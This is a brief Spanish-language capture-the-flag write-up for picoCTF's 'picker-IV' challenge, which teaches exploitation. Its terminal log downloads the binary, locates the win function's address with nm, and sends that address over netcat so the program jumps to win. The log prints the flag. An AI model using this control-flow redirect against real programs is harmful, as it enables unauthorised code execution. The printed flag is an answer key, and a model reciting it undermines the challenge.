### Descripción
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 54668`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV.c). The binary can be downloaded [here](https://artifacts.picoctf.net/c/527/picker-IV).
### Solución
```

descragamos el archivo y vemos el mapa de direcciones, luego filtramos win, nos conectamos e ingresamos la direccion encontrada, al darle la dirección de `win`, engañamos al programa para que ejecute código que normalmente estaba "fuera de su alcance" en el flujo normal y nos da la flag

 wget https://artifacts.picoctf.net/c/527/picker-IV
--2026-05-04 20:20:16--  https://artifacts.picoctf.net/c/527/picker-IV
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.170.131.33, 3.170.131.72, 3.170.131.77, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.170.131.33|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17272 (17K) [application/octet-stream]
Saving to: 'picker-IV'

picker-IV              100%[============================>]  16.87K  --.-KB/s    in 0.004s  

2026-05-04 20:20:16 (3.74 MB/s) - 'picker-IV' saved [17272/17272]

giselle_maz-picoctf@webshell:~$  
giselle_maz-picoctf@webshell:~$ nm picker-IV | grep win
000000000040129e T win
giselle_maz-picoctf@webshell:~$ nc saturn.picoctf.net 54668
Enter the address in hex to jump to, excluding '0x': 000000000040129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
```
### Notas adicionales 

### Referencias